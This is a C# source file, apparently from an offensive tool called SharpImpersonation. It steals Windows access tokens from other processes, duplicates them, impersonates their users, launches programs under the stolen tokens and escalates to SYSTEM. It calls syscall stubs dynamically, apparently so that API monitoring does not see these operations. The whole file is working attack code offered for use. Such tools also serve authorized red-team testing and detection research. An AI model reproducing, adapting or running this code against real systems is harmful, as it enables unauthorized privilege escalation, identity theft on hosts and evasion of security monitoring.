using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.Text;


namespace SharpImpersonation
{


    class Tokens : IDisposable
    {

        protected IntPtr phNewToken;
        protected IntPtr hExistingToken;
        protected IntPtr phLastToken;
        private IntPtr currentProcessToken;
        private Dictionary<String, UInt32> processes;

        internal delegate Boolean Create(IntPtr phNewToken, String newProcess, String arguments);

        public static List<String> validPrivileges = new List<string> { "SeAssignPrimaryTokenPrivilege",
            "SeAuditPrivilege", "SeBackupPrivilege", "SeChangeNotifyPrivilege", "SeCreateGlobalPrivilege",
            "SeCreatePagefilePrivilege", "SeCreatePermanentPrivilege", "SeCreateSymbolicLinkPrivilege",
            "SeCreateTokenPrivilege", "SeDebugPrivilege", "SeEnableDelegationPrivilege",
            "SeImpersonatePrivilege", "SeIncreaseBasePriorityPrivilege", "SeIncreaseQuotaPrivilege",
            "SeIncreaseWorkingSetPrivilege", "SeLoadDriverPrivilege", "SeLockMemoryPrivilege",
            "SeMachineAccountPrivilege", "SeManageVolumePrivilege", "SeProfileSingleProcessPrivilege",
            "SeRelabelPrivilege", "SeRemoteShutdownPrivilege", "SeRestorePrivilege", "SeSecurityPrivilege",
            "SeShutdownPrivilege", "SeSyncAgentPrivilege", "SeSystemEnvironmentPrivilege",
            "SeSystemProfilePrivilege", "SeSystemtimePrivilege", "SeTakeOwnershipPrivilege",
            "SeTcbPrivilege", "SeTimeZonePrivilege", "SeTrustedCredManAccessPrivilege",
            "SeUndockPrivilege", "SeUnsolicitedInputPrivilege" };

 
        ////////////////////////////////////////////////////////////////////////////////
        // Default Constructor
        ////////////////////////////////////////////////////////////////////////////////
        public Tokens()
        {
            phNewToken = new IntPtr();
            hExistingToken = new IntPtr();
            processes = new Dictionary<String, UInt32>();
            WindowsPrincipal windowsPrincipal = new WindowsPrincipal(WindowsIdentity.GetCurrent());
            if (!windowsPrincipal.IsInRole(WindowsBuiltInRole.Administrator))
            {
                Console.WriteLine("[-] Administrator privileges required");
            }

            currentProcessToken = new IntPtr();

            // NtOpenProcessToken
            var stub = InvokeItDynamically.DynGen.GetSyscallStub("NtOpenProcessToken");
            NtOpenProcessToken NtOpenProcTok = (NtOpenProcessToken)Marshal.GetDelegateForFunctionPointer(stub, typeof(NtOpenProcessToken));

            InvokeItDynamically.Native.NTSTATUS statusresult = NtOpenProcTok(
                Process.GetCurrentProcess().Handle,
                (UInt32)ACCESS_MASK.MAXIMUM_ALLOWED,
                out currentProcessToken);
            #if DEBUG
            if (statusresult == 0)
            {
                Console.WriteLine("\r\n[+] NtOpenProcessToken Success!");
            }
            else
            {
                Console.WriteLine("[-] NtOpenProcessToken failed - error code: " + statusresult);
            }
#endif


            //managed.OpenProcessToken(Process.GetCurrentProcess().Handle, Constants.TOKEN_ALL_ACCESS, out currentProcessToken);
            SetTokenPrivilege(ref currentProcessToken, Constants.SE_DEBUG_NAME, Token.TokenPrivileges.SE_PRIVILEGE_ENABLED);
        }

        protected Tokens(Boolean rt)
        {
            phNewToken = new IntPtr();
            phLastToken = new IntPtr();
            hExistingToken = new IntPtr();
            processes = new Dictionary<String, UInt32>();

            currentProcessToken = new IntPtr();

            // NtOpenProcessToken
            var stub = InvokeItDynamically.DynGen.GetSyscallStub("NtOpenProcessToken");
            NtOpenProcessToken NtOpenProcTok = (NtOpenProcessToken)Marshal.GetDelegateForFunctionPointer(stub, typeof(NtOpenProcessToken));

            InvokeItDynamically.Native.NTSTATUS statusresult = NtOpenProcTok(
                Process.GetCurrentProcess().Handle,
                Constants.TOKEN_ALL_ACCESS,
                out currentProcessToken);

        }

        public void Dispose()
        {
            if (IntPtr.Zero != phNewToken)
            {
                // NtClose
                var stub = InvokeItDynamically.DynGen.GetSyscallStub("NtClose");
                NtClose NtClose = (NtClose)Marshal.GetDelegateForFunctionPointer(stub, typeof(NtClose));

                NtClose(phNewToken);
            }
            if (IntPtr.Zero != hExistingToken)
            {
                // NtClose
                var stub = InvokeItDynamically.DynGen.GetSyscallStub("NtClose");
                NtClose NtClose = (NtClose)Marshal.GetDelegateForFunctionPointer(stub, typeof(NtClose));
            
                NtClose(hExistingToken);
            }
        }

        ////////////////////////////////////////////////////////////////////////////////
        // Default Destructor
        ////////////////////////////////////////////////////////////////////////////////
        ~Tokens()
        {
            Dispose();
        }

        ////////////////////////////////////////////////////////////////////////////////
        // Calls CreateProcessWithTokenW
        ////////////////////////////////////////////////////////////////////////////////
        public Boolean StartProcessAsUser(Int32 processId, String newProcess)
        {
            Console.WriteLine("[*] Stealing token from ProcID: " + processId + " to start binary: " + newProcess);
            bool success = GetPrimaryToken((UInt32)processId, "");
            if (!(success))
            {
                Console.WriteLine("[-] GetPrimaryToken failed!");
            }
            if (hExistingToken == IntPtr.Zero)
            {
                Console.WriteLine("Existing token zero");

                return false;
            }


            // NtDuplicateToken
            var stub = InvokeItDynamically.DynGen.GetSyscallStub("NtDuplicateToken");
            NtDuplicateToken2 NtDuplicateTok = (NtDuplicateToken2)Marshal.GetDelegateForFunctionPointer(stub, typeof(NtDuplicateToken2));

            var statusresult = NtDuplicateTok(
                hExistingToken,
                ACCESS_MASK.MAXIMUM_ALLOWED,
                IntPtr.Zero,
                true,
                _TOKEN_TYPE.TokenPrimary,
                ref phNewToken);
            #if DEBUG
            if (statusresult == 0)
            {
                Console.WriteLine("\r\n[+] NtDuplicateToken Success!");
            }
            else
            {
                Console.WriteLine("[-] NtDuplicateToken failed - error code: " + statusresult);
                return false;
            }
#endif


            Console.WriteLine(" [+] Duplicate Token Handle: 0x{0}", phNewToken.ToString("X4"));

            Create createProcess;
            if (0 == Process.GetCurrentProcess().SessionId)
            {
                createProcess = CreateProcess.CreateProcessWithLogonW;
            }
            else
            {
                createProcess = CreateProcess.CreateProcessWithTokenW;
            }
            String arguments = String.Empty;
            FindExe(ref newProcess, out arguments);
            string priv = "SeAuditPrivilege";
            phNewToken = SetTokenPrivilegeTest(ref phNewToken, priv, Token.TokenPrivileges.SE_PRIVILEGE_ENABLED);
            
            if (!createProcess(phNewToken, newProcess, arguments))
            {
                return false;
            }
            return true;
        }

        protected void FindExe(ref String command, out String arguments)
        {
            arguments = "";
            if (command.Contains(" "))
            {
                String[] commandAndArguments = command.Split(new String[] { " " }, StringSplitOptions.RemoveEmptyEntries);
                command = commandAndArguments.First();
                arguments = String.Join(" ", commandAndArguments.Skip(1).Take(commandAndArguments.Length - 1).ToArray());
            }
        }


        public static void ThreadStart()
        {
            Console.WriteLine("[+] Operating as {0}", System.Security.Principal.WindowsIdentity.GetCurrent().Name);
        }

        ////////////////////////////////////////////////////////////////////////////////
        // Impersonates the token from a specified processId
        ////////////////////////////////////////////////////////////////////////////////
        public virtual Boolean ImpersonateUser(Int32 processId)
        {
            Console.WriteLine("[*] Impersonating {0}", processId);
            GetPrimaryToken((UInt32)processId, "");
            if (hExistingToken == IntPtr.Zero)
            {
                return false;
            }

            var stub = InvokeItDynamically.DynGen.GetSyscallStub("NtDuplicateToken");
            NtDuplicateToken NtDuplicateToke = (NtDuplicateToken)Marshal.GetDelegateForFunctionPointer(stub, typeof(NtDuplicateToken));

            // This is 100% needed, as without setting those SQoS settings the token is not usable https://twitter.com/tiraniddo/status/1524454664036818944 
            // <3
            SecurityQualityOfService sQoS = new SecurityQualityOfService();
            sQoS.ImpersonationLevel = SecurityImpersonationLevel.Impersonation;
            sQoS.ContextTrackingMode = SecurityContextTrackingMode.Static;
            sQoS.EffectiveOnly = false;
            ObjectAttributes tokenObjectAttributes = new ObjectAttributes(IntPtr.Zero, 0, IntPtr.Zero, sQoS, IntPtr.Zero);

            IntPtr ObjectAttributesPointer = IntPtr.Zero;
            uint statusresult = NtDuplicateToke(
                hExistingToken,
                TokenAccessFlags.TOKEN_IMPERSONATE | TokenAccessFlags.TOKEN_QUERY,
                tokenObjectAttributes,
                false,
                _TOKEN_TYPE.TokenImpersonation,
                ref phNewToken);

            if (statusresult == 0)
            {
                Console.WriteLine("\r\n[+] NtDuplicateToken Success!");
            }
            else
            {
                Console.WriteLine("[-] NtDuplicateToken failed - error code: " + statusresult);
                return false;
            }

            // NtSetInformationThread
            stub = InvokeItDynamically.DynGen.GetSyscallStub("NtSetInformationThread");
            NtSetInformationThread NtSetInformationThr = (NtSetInformationThread)Marshal.GetDelegateForFunctionPointer(stub, typeof(NtSetInformationThread));
            //var idThead = Process.GetCurrentProcess().Threads[0];
            GCHandle pinnedArray = GCHandle.Alloc(phNewToken, GCHandleType.Pinned);
            IntPtr tokenPointer = pinnedArray.AddrOfPinnedObject();

            statusresult = NtSetInformationThr(
                (IntPtr)(-2)/*Current Thread*/,
                ThreadInformationClass.ThreadImpersonationToken,
                tokenPointer,
                IntPtr.Size);

            pinnedArray.Free();
            if (statusresult == 0)
            {
                Console.WriteLine("\r\n[+] NtSetInformationThread Success!");
            }
            else
            {
                Console.WriteLine("[-] NtSetInformationThread failed - error code: " + statusresult);
                return false;
            }

            Console.WriteLine("[+] Operating as {0}", System.Security.Principal.WindowsIdentity.GetCurrent().Name);
            return true;
        }

        ////////////////////////////////////////////////////////////////////////////////
        // Elevates current process to SYSTEM
        ////////////////////////////////////////////////////////////////////////////////
        public Boolean GetSystem()
        {
            SecurityIdentifier securityIdentifier = new SecurityIdentifier(WellKnownSidType.LocalSystemSid, null);
            NTAccount systemAccount = (NTAccount)securityIdentifier.Translate(typeof(NTAccount));

            Console.WriteLine("[*] Searching for {0}", systemAccount.ToString());
            processes = Enumeration.EnumerateUserProcesses(false, systemAccount.ToString());

            foreach (UInt32 process in processes.Values)
            {
                if (ImpersonateUser((Int32)process))
                {
                    return true;
                }
            }
            return false;
        }

        ////////////////////////////////////////////////////////////////////////////////
        // Sets hToken to a processes primary token
        ////////////////////////////////////////////////////////////////////////////////
        public virtual Boolean GetPrimaryToken(UInt32 processId, String name)
        {

            // NtOpenProcess
            IntPtr stub = InvokeItDynamically.DynGen.GetSyscallStub("NtOpenProcess");
            NtOpenProcess OpenProc = (NtOpenProcess)Marshal.GetDelegateForFunctionPointer(stub, typeof(NtOpenProcess));

            IntPtr hProcess = IntPtr.Zero;
            OBJECT_ATTRIBUTES oa = new OBJECT_ATTRIBUTES();

            CLIENT_ID ci = new CLIENT_ID
            {
                UniqueProcess = (IntPtr)((UInt32)processId)
            };

            InvokeItDynamically.Native.NTSTATUS statusresult;

            statusresult = OpenProc(
                ref hProcess,
                Constants.PROCESS_QUERY_LIMITED_INFORMATION,
                ref oa,
                ref ci);
            #if DEBUG
            if (statusresult == 0)
            {
                Console.WriteLine("\r\n[+] NtOpenProcess Success!");
            }
            else
            {
                Console.WriteLine("[-] NtOpenProcess failed - error code: " + statusresult);
            }
#endif

            if (hProcess == IntPtr.Zero)
            {
                return false;
            }
            Console.WriteLine("[+] Recieved Handle for: {0} ({1})", name, processId);
            Console.WriteLine(" [+] Process Handle: 0x{0}", hProcess.ToString("X4"));

            // NtOpenProcessToken
            stub = InvokeItDynamically.DynGen.GetSyscallStub("NtOpenProcessToken");
            NtOpenProcessToken NtOpenProcTok = (NtOpenProcessToken)Marshal.GetDelegateForFunctionPointer(stub, typeof(NtOpenProcessToken));

            statusresult = NtOpenProcTok(
                hProcess,
                (UInt32)Constants.TOKEN_ALT,
                out hExistingToken);
            #if DEBUG
            if (statusresult == 0)
            {
                Console.WriteLine("\r\n[+] NtOpenProcessToken Success!");
            }
            else
            {
                Console.WriteLine("[-] NtOpenProcessToken failed - error code: " + statusresult);
            }
#endif
            
            if (statusresult != 0)
            {
                Console.WriteLine(@"[-] Could not open Process Token, trying as SYSTEM ¯\_(ツ)_/¯ ");
                GetSystem();

                // NTOpenProcessToken
                statusresult = NtOpenProcTok(
                    hProcess,
                    (UInt32)Constants.TOKEN_ALT,
                    out hExistingToken);
                #if DEBUG
                if (statusresult == 0)
                {
                    Console.WriteLine("\r\n[+] NtOpenProcessToken Success!");
                }
                else
                {
                    Console.WriteLine("[-] NtOpenProcessToken failed - error code: " + statusresult);
                }
#endif
                if (statusresult != 0)
                {
                    Console.WriteLine(@"[-] Still failed :-(");
                    return false;
                }
            }
            Console.WriteLine("[+] Primary Token Handle: 0x{0}", hExistingToken.ToString("X4"));

            // NtClose
            stub = InvokeItDynamically.DynGen.GetSyscallStub("NtClose");
            NtClose NtClose = (NtClose)Marshal.GetDelegateForFunctionPointer(stub, typeof(NtClose));
            statusresult = NtClose(hProcess);
            return true;
        }

        

        ////////////////////////////////////////////////////////////////////////////////
        // Sets a Token to have a specified privilege
        // http://www.leeholmes.com/blog/2010/09/24/adjusting-token-privileges-in-powershell/
        // https://support.microsoft.com/en-us/help/131065/how-to-obtain-a-handle-to-any-process-with-sedebugprivilege
        ////////////////////////////////////////////////////////////////////////////////
        public static void SetTokenPrivilege(ref IntPtr hToken, String privilege, Token.TokenPrivileges attribute)
        {
            if (!validPrivileges.Contains(privilege))
            {
                Console.WriteLine("[-] Invalid Privilege Specified");
                return;
            }

            Console.WriteLine("[*] Adjusting Token Privilege");
            ////////////////////////////////////////////////////////////////////////////////
            _LUID luid = new _LUID();

            // LookupPrivilegeValue args
            object[] LookupPrivilegeValueArgs =
            {
                null,
                privilege,
                luid
            };
            Console.WriteLine(privilege);
            bool success = (bool)InvokeItDynamically.DynGen.DynamicAPIInvoke("advapi32.dll", "LookupPrivilegeValueA", typeof(LookupPrivilegeValue), ref LookupPrivilegeValueArgs, true, true);

            if (!(success))
            {
                GetWin32Error("LookupPrivilegeValue");
                return;
            }
            Console.WriteLine(" [+] Recieved luid");

            ////////////////////////////////////////////////////////////////////////////////
            _LUID_AND_ATTRIBUTES luidAndAttributes = new _LUID_AND_ATTRIBUTES
            {
                Luid = luid,
                Attributes = (uint)attribute
            };
            _TOKEN_PRIVILEGES newState = new _TOKEN_PRIVILEGES
            {
                PrivilegeCount = 1,
                Privileges = luidAndAttributes
            };
            _TOKEN_PRIVILEGES previousState = new _TOKEN_PRIVILEGES();
            Console.WriteLine(" [*] AdjustTokenPrivilege");
            UInt32 returnLength = 0;

            // AdjustTokenPrivileges args
            object[] AdjustTokenPrivilegesArgs =
            {
               hToken, false, newState, (UInt32)Marshal.SizeOf(newState), previousState, returnLength
            };

            success = (bool)InvokeItDynamically.DynGen.DynamicAPIInvoke("advapi32.dll", "AdjustTokenPrivileges", typeof(AdjustTokenPrivileges), ref AdjustTokenPrivilegesArgs, true, true);
            returnLength = (UInt32)AdjustTokenPrivilegesArgs[5];
            if (!(success))
            {
                GetWin32Error("AdjustTokenPrivileges");
                return;
            }


            Console.WriteLine(" [+] Adjusted Privilege: {0}", privilege);
            Console.WriteLine(" [+] Privilege State: {0}", attribute);
            return;
        }

        // temporary testing purpose
        public static IntPtr SetTokenPrivilegeTest(ref IntPtr hToken, String privilege, Token.TokenPrivileges attribute)
        {
            if (!validPrivileges.Contains(privilege))
            {
                Console.WriteLine("[-] Invalid Privilege Specified");
                return IntPtr.Zero;
            }

            Console.WriteLine("[*] Adjusting Token Privilege");
            ////////////////////////////////////////////////////////////////////////////////
            _LUID luid = new _LUID();

            // LookupPrivilegeValue args
            object[] LookupPrivilegeValueArgs =
            {
                null,
                privilege,
                luid
            };
            Console.WriteLine(privilege);
            bool success = (bool)InvokeItDynamically.DynGen.DynamicAPIInvoke("advapi32.dll", "LookupPrivilegeValueA", typeof(LookupPrivilegeValue), ref LookupPrivilegeValueArgs, true, true);

            if (!(success))
            {
                GetWin32Error("LookupPrivilegeValue");
                return IntPtr.Zero;
            }
            Console.WriteLine(" [+] Recieved luid");

            ////////////////////////////////////////////////////////////////////////////////
            _LUID_AND_ATTRIBUTES luidAndAttributes = new _LUID_AND_ATTRIBUTES
            {
                Luid = luid,
                Attributes = (uint)attribute
            };
            _TOKEN_PRIVILEGES newState = new _TOKEN_PRIVILEGES
            {
                PrivilegeCount = 1,
                Privileges = luidAndAttributes
            };
            _TOKEN_PRIVILEGES previousState = new _TOKEN_PRIVILEGES();
            Console.WriteLine(" [*] AdjustTokenPrivilege");
            UInt32 returnLength = 0;

            // AdjustTokenPrivileges args
            object[] AdjustTokenPrivilegesArgs =
            {
               hToken, false, newState, (UInt32)Marshal.SizeOf(newState), previousState, returnLength
            };

            success = (bool)InvokeItDynamically.DynGen.DynamicAPIInvoke("advapi32.dll", "AdjustTokenPrivileges", typeof(AdjustTokenPrivileges), ref AdjustTokenPrivilegesArgs, true, true);
            returnLength = (UInt32)AdjustTokenPrivilegesArgs[5];
            if (!(success))
            {
                GetWin32Error("AdjustTokenPrivileges");
                return IntPtr.Zero;
            }


            Console.WriteLine(" [+] Adjusted Privilege: {0}", privilege);
            Console.WriteLine(" [+] Privilege State: {0}", attribute);
            return hToken;
        }

        
        public static void GetNtError(String location, UInt32 ntError)
        {
            object[] RtlNtStatusToDosErrorArgs =
             {
                    ntError
              };

            UInt32 win32Error = (UInt32)InvokeItDynamically.DynGen.DynamicAPIInvoke("ntdll.dll", "RtlNtStatusToDosError", typeof(RtlNtStatusToDosError), ref RtlNtStatusToDosErrorArgs, true, true);

            Console.WriteLine(" [-] Function {0} failed: ", location);
            Console.WriteLine(" [-] {0}", new System.ComponentModel.Win32Exception((Int32)win32Error).Message);
        }

        ////////////////////////////////////////////////////////////////////////////////
        ////////////////////////////////////////////////////////////////////////////////
        public static void GetWin32Error(String location)
        {
            Console.WriteLine(" [-] Function {0} failed: ", location);
            Console.WriteLine(" [-] {0}", new System.ComponentModel.Win32Exception(Marshal.GetLastWin32Error()).Message);
        }
    }
}
